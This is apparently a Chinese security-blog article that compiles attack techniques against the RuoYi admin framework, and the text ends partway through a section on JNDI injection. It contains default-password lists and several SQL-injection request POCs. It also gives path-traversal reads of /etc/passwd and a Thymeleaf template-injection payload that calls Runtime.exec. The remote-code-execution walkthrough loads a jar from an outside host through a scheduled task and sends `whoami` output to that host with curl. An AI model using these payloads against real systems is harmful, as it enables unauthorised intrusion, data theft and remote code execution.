> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzg3ODE2MjkxMQ==&mid=2247493415&idx=1&sn=0a6c89c645cd322031111cb9ac6001f8

#  若依系统前台+后台漏洞总结：RuoYi框架九大高危漏洞攻防指南|挖洞技巧  
Takake/影子先生  渗透安全HackTwo   2025-07-21 16:00  
  
**0x01 前言**  
  
RuoYi历史漏洞包括Shiro反序列化漏洞、SSTI漏洞、SQL注入、默认口令、任意文件下载、定时任务远程RCE等。其中，Shiro反序列化漏洞适用于RuoYi V-4.6.2之前的版本，SSTI漏洞适用于V-4.7.1版本，SQL注入适用于<V-4.6.2版本。任意文件下载漏洞适用于所有版本V-4.7.8之前，定时任务远程RCE适用于<V-4.7.2版本。文章还介绍了漏洞的复现过程、修复方法以及一些绕过策略。总结了RuoYi存在的各种漏洞，提醒用户及时修复以确保系统的安全性  
。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzGMfZgnNagpdl9o7gMgndtpiciaz4O8Yb9gnCnyUGzMXhXEAz5g12rvbHw/640?wx_fmt=png&from=appmsg "")  
  
  
现在只对常读和星标的公众号才展示大图推送，建议大家把**渗透安全HackTwo“设为星标”，否则可能就看不到了啦！**  
  
参考文章  
  

```
https://www.freebuf.com/articles/web/411980.html
https://www.cnblogs.com/wavewindsor/p/17880329.html
```

  
  
**末尾可领取挖洞资料文件 #渗透安全HackTwo**  
  
**0x02 漏洞详情**  
  
**若依前台漏洞**  
  
**若依特征**  

```
绿若依：icon_hash=”706913071”
```

  
![1727572725_66f8aaf5913854af7b059.png!small?1727572727336](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzGejHb6xj5rCc85SQqKc8M16MJ0ibEMkYba8s0Do1YDqzaF4rr2tnFqbg/640?wx_fmt=png&from=appmsg "")  
  
![1727572746_66f8ab0acfbd90eff09bb.png!small?1727572748450](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzGtdc76Aibs6kqicA4FvJoMO3T9KP6OictzLIb3Q0P51KUwb5Ks5WmWKgqQ/640?wx_fmt=png&from=appmsg "")  
  
绿若依常见登录页面  
  
![1727572755_66f8ab13c1e10317f12ce.png!small?1727572757872](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzGIoYnFEAPEt5uc80auP5plbrLicVtY6SN5iczovXsE97iaewlnudTzArog/640?wx_fmt=png&from=appmsg "")  

```
蓝若依：icon_hash=” -1231872293”
```

  
![1727572765_66f8ab1d95d8980459c26.png!small?1727572767228](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzGEAd8UI8PLE7T7g63lLpcTf5tAGuRiah1Mylf6dFAGmeZyjUFicWydRGA/640?wx_fmt=png&from=appmsg "")  
![1727572770_66f8ab22ca3194344356a.png!small?1727572772478](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzGsKYLjUvXnOYdrXfAYltXVibcdSiahlm5bU5AkpbYOlia9FyO3qEhZnZyQ/640?wx_fmt=png&from=appmsg "")  
  
蓝若依常见登录界面![1727572783_66f8ab2fda870fbbfce26.png!small?1727572785725](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzGLVzzal9g1ibzniaicdTcFhYCtHDdfu5ghzJ16nKxfYhJjc0slF8eRRicrA/640?wx_fmt=png&from=appmsg "")  
  
  
部分漏洞可借助若依综合漏洞利用工具一键扫描  
（工具在内部星球获取）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzGcic7sbia08vNRbmgHtzDiabhUWf4GZ05v7gPibDtrcSFwH2NVAFJhYXXnA/640?wx_fmt=png&from=appmsg "")  
  
若依框架通常使用的组件有springboot、webpack、shiro、druid、swagger、redis、zookeeper、mysql等  
  
未授权访问  
  
常见为绿若依，绿若依一般都会常用webpack组件，F12查看js文件，找到一个名为appxxxxxx.js的文件，搜索baseurl，找到api路径![1727572792_66f8ab387656bfe3b22d2.png!small?1727572794339](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzGwiaXWJxfc8K2prqldC8vDKNLFPTZ2k9dUDdJ7Lrwup5ndicd1INsXoXg/640?wx_fmt=png&from=appmsg "")  
  
  
常见的api路径有：/api、/dev-api、/prod-api等  
  
也有一些api路径指向的是另一个网址![1727572798_66f8ab3e79f5aec4a9f85.png!small?1727572800300](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzGBsPRSotUqUJ58L3xJQkKoq8ibt5ibagTk8pGibDRPgGJ1CBHZCibHhYm3g/640?wx_fmt=png&from=appmsg "")  
  
  
访问后为如下界面![1727572806_66f8ab4688d3c483c8dd7.png!small?1727572808185](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzGibMLwqQh36ibx0fB1exnqHb2UibG8jefzyDXOHtwWwGTdPia6n6vP6Zvrg/640?wx_fmt=png&from=appmsg "")  
  
  
对其进行目录扫描能发现许多信息  
  
常见的未授权有druid、springboot、swagger  
  
在api后面拼接对应路径  
## druid未授权  
  
druid：http://ip/baseurl/druid/login.html![1727572819_66f8ab536bd4b0f14a210.png!small?1727572821055](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzGj3ujiaP95ibFBKn9ia4vTLibgNutxuRt08E1k4E8IicUtL8VQyBEzgmLBWA/640?wx_fmt=png&from=appmsg "")  
  
  
如果有未授权可以直接访问，需要账号密码的可以配合若依系统弱口令进行登录  
  
常见弱口令有：  

```
admin/admin
admin/admin123
admin/123456
ry/123456
ruoyi/123456
```

  
登录后重点查看Session监控和URI监控两处  
  
Session监控里存在历史登录的Session，可以尝试替换Session值进行登录![1727572829_66f8ab5d50e2ecf0c6ff4.png!small?1727572833031](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzGhAlIkVpBDs0XQlwGl3ufTQ7B8Jj7sStsobNGLOj4QTLswcJH0C2SSw/640?wx_fmt=png&from=appmsg "")  
  
  
URI监控处存在大量接口路径，可以进一步访问获取敏感信息![1727572856_66f8ab78c27eb5bd8fffc.png!small?1727572864241](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzG2UNeeXGYBeaL88Kx0icuUWB7nfMWPrvyKcpnkbP2IxLcY8EYeOlWGnA/640?wx_fmt=png&from=appmsg "")  
  
## swagger未授权  
  
swagger：http://ip/baseurl/swagger-ui/![1727572857_66f8ab79ecea1486169a3.png!small?1727572864242](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzGFYhyBsAAFglY0AUc3EtFWAibXOZuAIwictxRQkgHCKl2YO7Q1KfEBt0A/640?wx_fmt=png&from=appmsg "")  
  
  
可以通过接口文档进行下一步操作，如果发现大量接口可以使用工具进行自动化测试，如swagger-hack![1727572861_66f8ab7dbdea8c67925dd.png!small?1727572864243](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzGwTFOO71Bt39PDMe6NuHNMFfcATibeF0aTicwd7YW2PBr0TibgCYasBmew/640?wx_fmt=png&from=appmsg "")  
  
## springboot未授权  
  
springboot：http://ip/baseurl/actuator![1727572858_66f8ab7ade9ee2f89361e.png!small?1727572864241](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzGGic1iclW3w15qdQic6nmbkGxmszdwU9tXlfibdaRwrLkfeYaJ85kClicNBQ/640?wx_fmt=png&from=appmsg "")  
  
  
重点关注/actuator/heapdump路径  
  
访问下载后使用工具对其进行分析可获得大量敏感信息![1727572864_66f8ab806136b32a8aef6.png!small?1727572866062](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzGzF6mK3B6uFqEYVV2HsNXicH7vyfCiboTGkeRlAChNQyLLHZCDMNRLRWQ/640?wx_fmt=png&from=appmsg "")  
![1727572868_66f8ab849db7e63eaf82b.png!small?1727572870734](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzGMZkMBiczvtmUCpjicjEIlSgkalKeoVHda2gDk9gxqgK4icIaDajBibRickQ/640?wx_fmt=png&from=appmsg "")  
  
## redis未授权  
  
若依系统通常会用到mysql和redis数据库，可以尝试redis未授权访问，或者对数据库进行弱口令爆破  
# 弱口令+默认密码  
  
常见登录界面路径为：/login  
  
如果页面访问显示不正常，可添加默认访问路径尝试是否显示正常  
  
/login?redirect=%2Findex  
  
/baseurl/login?redirect=%2Findex  
  
有些若依系统的账号密码会直接显示在前台登录框中，可以直接利用进行登录![1727572877_66f8ab8da613b0452cabe.png!small?1727572881914](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzGIfX6JJUAB6yA04mNqCr0BExhCtgNoCFib0sDyErSskCic5TZZWUAkibPQ/640?wx_fmt=png&from=appmsg "")  
  
  
常见的弱口令有：  

```
admin/admin
admin/admin123
admin/123456
ry/123456
ry/admin123
ruoyo/admin123
ruoyi/123456
```

# 注册接口  
  
在弱口令等方法都试过之后还无法登录，可以尝试访问注册接口看看系统是否允许注册  
  
访问：/register  
  
不允许注册![1727572884_66f8ab94974e7f5c473b4.png!small?1727572886504](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzG911Hge4zibWCViauGAnpg5vYgad79mlb5EexFfAJuVKoCSQ1Bk2HHXuQ/640?wx_fmt=png&from=appmsg "")  
  
  
允许注册  
  
![1727572890_66f8ab9a1d4a5be7a0db6.png!small?1727572891925](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzGou1SKV4Ricednuhw2Zalrhn5uTjXL8zhtEy0ibETIMy8HR72lHUCq5HA/640?wx_fmt=png&from=appmsg "")  
  
注册成功后就可以使用注册账号登录进一步测试  
# shiro反序列化  
  
若依登录界面通常都采用了rememberMe字段，如果存在默认的key值，则可以进一步利用，实现shiro反序列化  
  
![1727572902_66f8aba685d91c4bc655b.png!small?1727572904315](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzGg0ZkibL3iaia8CYAHP0QNKymdEtLibsCOHFmGpG0xhtOCfCznouw2qdE1A/640?wx_fmt=png&from=appmsg "")  
# 未授权文件上传  
  
常见于绿若依系统，F12查找js中的app.js，搜索uploadurl![1727572910_66f8abae9a9f0ccc475f2.png!small?1727572912373](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzGHEzyuaMxwMA8pNJ6A0kmibJjVNdPuuklhQBicAedOuicdCya93UzlLNXQ/640?wx_fmt=png&from=appmsg "")  
  
  
访问对应路径/baseurl/common/upload  
  
有鉴权![1727572916_66f8abb40de0f700e847c.png!small?1727572917672](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzG6QTnRH66e2oZpyOacWdjNfzCv0K3J9YerkdS0ZhV2fY87PZ4IQkcnA/640?wx_fmt=png&from=appmsg "")  
  
  
未授权![1727572920_66f8abb8c423200a3ff48.png!small?1727572922849](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzGia8d3APfdef9icSu3BoWy3cW3bWFiatwib1ras5NtHDnTRAfSI8TyfydKw/640?wx_fmt=png&from=appmsg "")  
  
  
构造对应的文件上传请求包![1727572929_66f8abc1e52370d7d1772.png!small?1727572931753](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzGPkiaZVVePVH4OJUric6y0J7gSG5wccaKfYKW63CJK2sFSWzN1lyeXUDA/640?wx_fmt=png&from=appmsg "")  
  
  
访问返回的文件路径![1727572934_66f8abc6f045c980da676.png!small?1727572936659](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzGibXYUZvfWfu2gXGRrjONrvL2OrnibbmMjyicKwpia9E3cDDqNqzGCLnPvQ/640?wx_fmt=png&from=appmsg "")  
  
  
有些网站做了限制，只允许白名单上传![1727572940_66f8abccc7b2feb5310e7.png!small?1727572942465](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzGjqslB8jxuVtE3pX78tPkOPvdRoEZ5gLkQrtxEXVGOV6sLOG6gWa72g/640?wx_fmt=png&from=appmsg "")  
  
  
这种情况可以打带有xss的html文件，造成存储xss  
  
没限制的网站可以直接getshell  
  
若依后台漏洞  
## 若依后台存在多处sql注入漏洞  
### 漏洞简介  
  
若依后台存在多个SQL注入点  
### 漏洞复现  
  
进入后台后，拦截角色管理页面的请求包  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzGY7eLanJmhHzXQH8ibbwkgXFAcv0vV26yhAPXhENo7z1zJDwajbFvueg/640?wx_fmt=png&from=appmsg "")  
  
  
POC：  

```
POST /system/role/list HTTP/1.1
Host: 127.0.0.1
Content-Length: 179
sec-ch-ua: &#34;Chromium&#34;;v=&#34;109&#34;, &#34;Not_A Brand&#34;;v=&#34;99&#34;
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
sec-ch-ua-platform: &#34;Windows&#34;
Origin: http://127.0.0.1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1/system/role
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: o0At_2132_saltkey=JW6Gt2hb; o0At_2132_lastvisit=1691240426; o0At_2132_ulastactivity=2db4EUfD9WS50eLvnip%2B9TxK2ZhcO65vPL0dA6sPVF8AQSBMa6Qn; JSESSIONID=cfcf2d1f-f180-46cf-98bb-5eacc4206014
Connection: close
pageSize=&pageNum=&orderByColumn=&isAsc=&roleName=&roleKey=&status=&params[beginTime]=&params[endTime]=&params[dataScope]=and extractvalue(1,concat(0x7e,(select database()),0x7e))
```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzGUFogFMsHXA1vGUKjJuAtiaiaZvQibsefxGNAnl7CpV2FgylZlKzDz5nQw/640?wx_fmt=png&from=appmsg "")  
  
  
第二个sql注入点：角色编辑接口  
  
POC:  

```
POST /system/dept/edit HTTP/1.1
Host: 127.0.0.1
Content-Length: 111
sec-ch-ua: &#34;Chromium&#34;;v=&#34;109&#34;, &#34;Not_A Brand&#34;;v=&#34;99&#34;
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
sec-ch-ua-platform: &#34;Windows&#34;
Origin: http://127.0.0.1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1/system/role
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: o0At_2132_saltkey=JW6Gt2hb; o0At_2132_lastvisit=1691240426; o0At_2132_ulastactivity=2db4EUfD9WS50eLvnip%2B9TxK2ZhcO65vPL0dA6sPVF8AQSBMa6Qn; JSESSIONID=cfcf2d1f-f180-46cf-98bb-5eacc4206014
Connection: close
DeptName=1&DeptId=100&ParentId=12&Status=0&OrderNum=1&ancestors=0)or(extractvalue(1,concat((select user()))));#
```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzGcewUYrA7AEsMibqzsgvUme04aboAqB3ewvBGlvNNWt1zeDbFprpbR3w/640?wx_fmt=png&from=appmsg "")  
  
  
第三个sql注入点POC：  

```
POST /system/role/export HTTP/1.1
Host: 127.0.0.1
Content-Length: 75
sec-ch-ua: &#34;Chromium&#34;;v=&#34;109&#34;, &#34;Not_A Brand&#34;;v=&#34;99&#34;
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
sec-ch-ua-platform: &#34;Windows&#34;
Origin: http://127.0.0.1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1/system/role
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: o0At_2132_saltkey=JW6Gt2hb; o0At_2132_lastvisit=1691240426; o0At_2132_ulastactivity=2db4EUfD9WS50eLvnip%2B9TxK2ZhcO65vPL0dA6sPVF8AQSBMa6Qn; JSESSIONID=cfcf2d1f-f180-46cf-98bb-5eacc4206014
Connection: close
params[dataScope]=and extractvalue(1,concat(0x7e,(select database()),0x7e))
```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzGiawgdVicEJzhMxQICbSkYHKHy2iamoJv3MZdyicIMZaTicYq3DJ8cQIysAw/640?wx_fmt=png&from=appmsg "")  
### RuoYi4.7.5版本后台sql注入  
  
ruoyi-4.7.5 后台 com/ruoyi/generator/controller/GenController 下/tool/gen/createTable路由存在sql注入。  
  
POC：  

```
sql=CREATE table ss1 as SELECT/**/* FROM sys_job WHERE 1=1 union/**/SELECT/**/extractvalue(1,concat(0x7e,(select/**/version()),0x7e));
```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzGufEdK0HbMiapJdTOsonQUVvOqApb7libcSOdzKhEhCibnIlO28vUEbgDw/640?wx_fmt=png&from=appmsg "")  
## 若依后台任意文件读取（CNVD-2021-01931）  
### 漏洞简介  
  
若依管理系统是基于springboot的权限管理系统，登录后台后可以读取服务器上的任意文件。影响版本：RuoYi<4.5.1  
### 漏洞复现  
  
POC:  

```
/common/download/resource?resource=/profile/../../../../etc/passwd
/common/download/resource?resource=/profile/../../../../Windows/win.ini
```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzGH2TQ38ZAaJNGI5JYzl2qdJ9hiaSHWlj9zCf8AutN84xLhqQu0ftshaQ/640?wx_fmt=png&from=appmsg "")  
  
读取了D盘下的1.txt文件  
## 若依后台任意文件下载漏洞  
### 漏洞简介  
  
若依管理系统后台存在任意文件下载漏洞。影响版本：若依管理系统4.7.6及以下版本  
### 漏洞复现  
  
漏洞利用前提：登录进后台。  
  
首先提交一个定时任务。  

```
POST /monitor/job/add HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-CA,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 188
Connection: close
Cookie: o0At_2132_saltkey=JW6Gt2hb; o0At_2132_lastvisit=1691240426; o0At_2132_ulastactivity=2db4EUfD9WS50eLvnip%2B9TxK2ZhcO65vPL0dA6sPVF8AQSBMa6Qn; JSESSIONID=61e79ae9-8cdd-4e51-baac-d269ef551df3
createBy=admin&jobName=renwu&jobGroup=DEFAULT&invokeTarget=ruoYiConfig.setProfile('c://windows/win.ini')&cronExpression=0%2F15+*+*+*+*+%3F&misfirePolicy=1&concurrent=1&status=0&remark=
```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzGgQQShicG4MicibqrePAfGmTFfwgTHefjrfoeVhFC780yJMUiaCI8NBBlrQ/640?wx_fmt=png&from=appmsg "")  
  
  
通过浏览器直接get请求以下地址即可，下载任意文件。  

```
http://127.0.0.1/common/download/resource?resource=c://windows/win.ini:.zip
```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzGpuGgWibnHGDo9PVsHcZecajerEjIM2CvN1NTlNcDm7BGia6xEJALuGTw/640?wx_fmt=png&from=appmsg "")  
## SSTI（模板注入）漏洞 (仅适用V-4.7.1)  
### 分析在RuoYi的  

```
ruoyi-admin\src\main\java\com\ruoyi\web\controller\monitor\CacheController.java
ruoyi-admin\src\main\java\com\ruoyi\web\controller\demo\controller\DemoFormController.java
```

  
下存在可控的return字段，且由于RuoYi使用的是  

```
thymeleaf
```

  
视图渲染组件，因此可进行  

```
SSTI模板注入
```

  
。  
  
其中可注入的接口包括  

```
/localrefresh/task
/getValue
/getKeys
/getNames
```

  
接口满足条件。  
  

```
PostMapping
```

  
注解控制，会在view中进行解析（或者  

```
GetMapping
```

  
）。  
  

```
return
```

  
 值可控（或者  

```
url
```

  
可控）  
  
可以通过在  
http://localhost/monitor/cache  
视图下点击按钮抓包，也可直接构包（该接口需要有效cookie）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzGnZ6qwS0nfLTjxVKJa2cvML4Lo3uALqgcgPc0PQ3SVRVSibcWt2lgzJA/640?wx_fmt=png&from=appmsg "")  
- 构建  

```
fragment
```

  
参数payload，由于系统未对  

```
fragment
```

  
参数做任何处理就进行返回，因此我们可以直接插入  

```
thymeleaf表达式
```

  
，使用’  

```
${}
```

  
注入执行表达式，  

```
T()
```

  
访问java类和静态访问。因此构建payload：  
  
- **${T(java.lang.Runtime).getRuntime().exec(“calc.exe”)}**  
  
- 由于thymeleaf高版本对T()进行了一些限制，不过可通过在  

```
T
```

  
和  

```
(
```

  
增加空格的办法进行绕过。  
  
- **${T (java.lang.Runtime).getRuntime().exec(“calc.exe”)}**  
 增加空格接口/monitor/cache/getName  
  
- 构包，接口   
**/monitor/cache/getName**  
 (需要有效的身份Cookie)  
  
- 注入  

```
cacheName
```

  
不能为空  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzGmOFr4vzAKGiboFZVQOgwXUD8CjHeEWy9ib7ESdNRsg45nPpLGdvrM0Yw/640?wx_fmt=png&from=appmsg "")  

```
bady: **cacheName=123&fragment=${T (java.lang.Runtime).getRuntime().exec(“calc.exe”)}**
```

  
四个接口的攻击方式一致，payload一致  
#### 接口/monitor/cache/getKeys  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzGe2KDk5gfgt4JLty6TC7IINxoCsTCNPkw6OjKF03UG1QtPCrtza66WQ/640?wx_fmt=png&from=appmsg "")  
#### 接口/monitor/cache/getValue  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzGORJibtPzk98NaFRdw4kbW3tzzwa2m7e6kSgr4EQ4BoH5c4M1DQeEVpA/640?wx_fmt=png&from=appmsg "")  
#### 接口/demo/form/localrefresh/task  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzGq0cpLbDYKxrvT4RFSVfKIicpEVfMKeJtzOkms2KiauO31SJamich3Z9dQ/640?wx_fmt=png&from=appmsg "")  
  
修复：  
在RuoYi-4.7.2版本中，使用了thymeleaf版本3.0.14.RELEASE已无法再进行注入。  
## 定时任务远程RCE（<V-4.7.2)  
> 需要注意的是由于是从远程加载类，通常只加载一次后，就会缓存该类，之后不会再加载，因此若在测试过程中，命令没有执行成功，可重新创建定时任务，更换端口等操作多次尝试。  
  
### SnakeYaml 反序列化  
#### 简介  
- 通常只要引用了  

```
Snakeyaml
```

  
包的几乎都可进行反序列化  
  
- 可查看代码是否调用   
**new Yaml()**  
;  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzGtbdiaUJ249T2fnibX8TmSWvmdRZzsdChfm4sWoeGxHzibqR4XA5QduM3w/640?wx_fmt=png&from=appmsg "")  
#### 漏洞复现(V-4.2)  
- 下载yaml反序列化payload  
工具  
  
- 该工具是通过org.yaml.snakeyaml.Yaml类来加载远程的类，通过远程类重写AwesomeScriptEngineFactory类，以此来达到执行远程恶意命令的目的。  
  
下载完工具后将  

```
src/artsploit/AwesomeScriptEngineFactory.java
```

  
文件中的  
**Runtime**  
执行语句改为你要执行的命令  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzGDDeAymnn8GUECjGcAAL82CMGCXByhLt515tgmmDLpOnLygaibuG5E2Q/640?wx_fmt=png&from=appmsg "")  
  
eg:   

```
curl http://192.168.31.246:7000?CMDEcho=$(whoami)
```

- 地址为启动任意启动的http服务，或者dnslog都可（主要用于命令回显）  
  
- 除此之外，我们需要使用  

```
$()
```

  
命令替换，用于命令回显，因此我们改写一下命令执行函数。  
  
- 改写方法如图  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzGyic5Mdgk0GgcWiaRY3aGq34oZ3WFXkkhvPickjs1vubgziawY110OGLXTA/640?wx_fmt=png&from=appmsg "")  

```
String[] cmd = {
    &#34;/bin/bash&#34;,
    &#34;-c&#34;,
    &#34;curl http://192.168.31.246:7000?echo=$(whoami)&#34;
};
Runtime.getRuntime().exec(cmd);
```

- 在工具根目录 编写yaml-payload.yml文件  
  

```
!!javax.script.ScriptEngineManager [  
  !!java.net.URLClassLoader [[  
    !!java.net.URL [&#34;http://192.168.31.246:8000/yaml-payload.jar&#34;]  
  ]]  
]  
```

- 使用JAVA编译该文件，并且打包为jar，命令如下  
  
  

```
$ javac src/artsploit/AwesomeScriptEngineFactory.java
$ jar -cvf yaml-payload.jar -C src/ .
```

  
- 然后在该位置使用python开启http服务，用于远程加载该jar文件  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzGtuLCMToic1jjSyzuibfhXUnW6Zia6B7gSBw3UYFqxcq7mtCwUDfGebvtA/640?wx_fmt=png&from=appmsg "")  
- 添加定时任务加载jar包  
  
- 目标字符串  
  

```
org.yaml.snakeyaml.Yaml.load(‘!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [“http://192.168.31.246:8000/yaml-payload.jar&#34;]]]]‘)
```

- cron表达式  
**0/10 **** ?**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzG18d59IiawK7EhcIibliaV1yCuIBlV6nib1LrmOia2h52HfB0Km10BW9aRfw/640?wx_fmt=png&from=appmsg "")  
- 定时任务请求包  
  

```
POST /monitor/job/edit HTTP/1.1
Host: 192.168.31.209
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 340
Origin: http://192.168.31.209
Connection: close
Referer: http://192.168.31.209/monitor/job/edit/112
Cookie: JSESSIONID=8fb6fb64-75c1-47ca-a145-0b7dd67ec5a2
jobId=112&updateBy=admin&jobName=RCE12&jobGroup=DEFAULT&invokeTarget=org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager+%5B!!java.net.URLClassLoader+%5B%5B!!java.net.URL+%5B%22http%3A%2F%2F192.168.31.246%3A8000%2Fyaml-payload.jar%22%5D%5D%5D%5D')&cronExpression=0%2F10+*+*+*+*+%3F&misfirePolicy=2&concurrent=1&status=1&remark=
```

- 创建任务后点击执行  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzGSicH0LB1I5NWzAuWia86ssbTJSibInsf5FQddUKPHDXIGlqyEw5SMTWlA/640?wx_fmt=png&from=appmsg "")  
- 回显结果如图  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzGfnCp2xkkUXUMVGWA14OLUwc6jXabaqMkbic7DsHT5eKxsjwxOCL4ZQA/640?wx_fmt=png&from=appmsg "")  
### JNDI注入  
#### 简介  
- 通过JNDI远程加载恶意类  
  
- 这次我们使用windows开发环境进行测试  
  
- 其次JNDI注入只在低版本JAVA中适用（小于以下版本可用）  
  
